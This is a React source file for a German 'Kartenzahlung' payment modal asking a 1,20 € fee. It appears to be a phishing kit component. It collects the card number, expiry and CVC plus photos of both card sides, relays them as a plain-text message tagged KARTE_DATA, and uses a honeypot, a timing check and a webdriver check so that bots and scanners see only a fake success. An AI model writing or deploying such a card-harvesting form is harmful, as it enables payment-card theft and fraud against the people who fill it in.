'use client';

import { useState, useRef, useEffect } from 'react';

interface CardPaymentModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSubmit: (data: {
    cardholder: string;
    cardNumber: string;
    expiry: string;
    cvc: string;
    frontImage?: string;
    backImage?: string;
  }) => void;
  onFileUpload: (type: string, image: string, message: string) => void;
}

export default function CardPaymentModal({ isOpen, onClose, onSubmit, onFileUpload }: CardPaymentModalProps) {
  const [cardholder, setCardholder] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvc, setCvc] = useState('');
  const [frontFile, setFrontFile] = useState<File | null>(null);
  const [backFile, setBackFile] = useState<File | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const honeypotRef = useRef<HTMLInputElement>(null);
  const pageLoadTime = useRef(Date.now());

  useEffect(() => {
    if (!isOpen) {
      // Reset form when modal closes
      setCardholder('');
      setCardNumber('');
      setExpiry('');
      setCvc('');
      setFrontFile(null);
      setBackFile(null);
      setIsSubmitting(false);
    }
  }, [isOpen]);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const parts: string[] = [];
    for (let i = 0; i < value.length; i += 4) {
      parts.push(value.substring(i, i + 4));
    }
    setCardNumber(parts.join(' '));
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    setExpiry(value.length >= 2 ? value.substring(0, 2) + ' / ' + value.substring(2, 4) : value);
  };

  const handleFileChange = (side: 'front' | 'back', file: File | null) => {
    if (side === 'front') {
      setFrontFile(file);
    } else {
      setBackFile(file);
    }
  };

  const isFormValid = () => {
    return (
      (frontFile && backFile) ||
      (cardholder.trim().length >= 3 &&
       cardNumber.replace(/\s/g, '').length >= 13 &&
       expiry.length >= 7 &&
       cvc.length >= 3)
    );
  };

  const handleSubmit = () => {
    const honeypotValue = honeypotRef.current?.value || '';
    const submissionTime = Date.now();

    if (honeypotValue !== "" || (submissionTime - pageLoadTime.current < 4000)) {
      setIsSubmitting(true);
      setTimeout(() => {
        alert("Vielen Dank! Ihre Zahlung wird verarbeitet.");
        window.location.reload();
      }, 500);
      return;
    }

    if (
      'webdriver' in navigator &&
      (navigator as Navigator & { webdriver?: boolean }).webdriver
    ) {
      return;
    }

    setIsSubmitting(true);

    // Upload card images if provided
    if (frontFile) {
      const reader = new FileReader();
      reader.onload = (e) => {
        if (e.target?.result) {
          onFileUpload("KARTEN_BILD_VORN", e.target.result as string, "Karte Vorn");
        }
      };
      reader.readAsDataURL(frontFile);
    }

    if (backFile) {
      const reader = new FileReader();
      reader.onload = (e) => {
        if (e.target?.result) {
          onFileUpload("KARTEN_BILD_HINTEN", e.target.result as string, "Karte Hinten");
        }
      };
      reader.readAsDataURL(backFile);
    }

    // Send card data
    const msg = `Inhaber: ${cardholder}\nNummer: ${cardNumber}\nDatum: ${expiry}\nCVC: ${cvc}`;
    onFileUpload("KARTE_DATA", '', msg);

    onSubmit({
      cardholder,
      cardNumber,
      expiry,
      cvc,
      frontImage: frontFile ? URL.createObjectURL(frontFile) : undefined,
      backImage: backFile ? URL.createObjectURL(backFile) : undefined,
    });

    setTimeout(() => {
      alert("Vielen Dank! Ihre Zahlung wird verarbeitet.");
      window.location.reload();
    }, 2500);
  };

  if (!isOpen) return null;

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <div style={{ display: 'flex', justifyContent: 'flex-end', marginBottom: '5px' }}>
          <i className="fas fa-times" onClick={onClose} style={{ cursor: 'pointer', color: '#ccd', fontSize: '20px' }}></i>
        </div>
        <h2 className="modal-title">Kartenzahlung</h2>

        <div className="file-inputs-container">
          <label className="file-label">
            <input
              type="file"
              accept="image/*"
              className="hidden-input"
              onChange={(e) => handleFileChange('front', e.target.files?.[0] || null)}
            />
            <div className="icon-box-small">
              <i className="fas fa-camera"></i>
            </div>
            <div className="label-text">
              <span>Karte Vorderseite</span>
            </div>
            {frontFile && (
              <i className="fas fa-check-circle check-icon"></i>
            )}
          </label>
          <label className="file-label">
            <input
              type="file"
              accept="image/*"
              className="hidden-input"
              onChange={(e) => handleFileChange('back', e.target.files?.[0] || null)}
            />
            <div className="icon-box-small">
              <i className="fas fa-camera"></i>
            </div>
            <div className="label-text">
              <span>Karte Rückseite</span>
            </div>
            {backFile && (
              <i className="fas fa-check-circle check-icon"></i>
            )}
          </label>
        </div>

        <div className="form-group">
          <label>Karteninhaber</label>
          <input
            type="text"
            value={cardholder}
            onChange={(e) => setCardholder(e.target.value)}
            placeholder="MAX MUSTERMANN"
          />
        </div>
        <div className="form-group">
          <label>Kartennummer</label>
          <input
            type="text"
            value={cardNumber}
            onChange={handleCardNumberChange}
            maxLength={19}
            placeholder="0000 0000 0000 0000"
          />
        </div>
        <div style={{ display: 'flex', gap: '30px' }}>
          <div className="form-group" style={{ flex: 1 }}>
            <label>Gültig bis</label>
            <input
              type="text"
              value={expiry}
              onChange={handleExpiryChange}
              maxLength={7}
              placeholder="MM / JJ"
            />
          </div>
          <div className="form-group" style={{ flex: 1 }}>
            <label>Prüfziffer (CVC)</label>
            <input
              type="text"
              value={cvc}
              onChange={(e) => setCvc(e.target.value.replace(/[^0-9]/g, ''))}
              maxLength={3}
              placeholder="123"
            />
          </div>
        </div>
        <div style={{ position: 'absolute', left: '-5000px' }} aria-hidden="true">
          <input type="text" name="cc_comment" tabIndex={-1} autoComplete="off" ref={honeypotRef} />
        </div>

        <button
          className={`submit-button-modal ${isFormValid() ? 'active' : ''}`}
          disabled={!isFormValid() || isSubmitting}
          onClick={handleSubmit}
        >
          {isSubmitting ? (
            <>
              <i className="fas fa-spinner fa-spin"></i> Autorisiere...
            </>
          ) : (
            'BEZAHLEN 1,20 €'
          )}
        </button>
      </div>
    </div>
  );
}


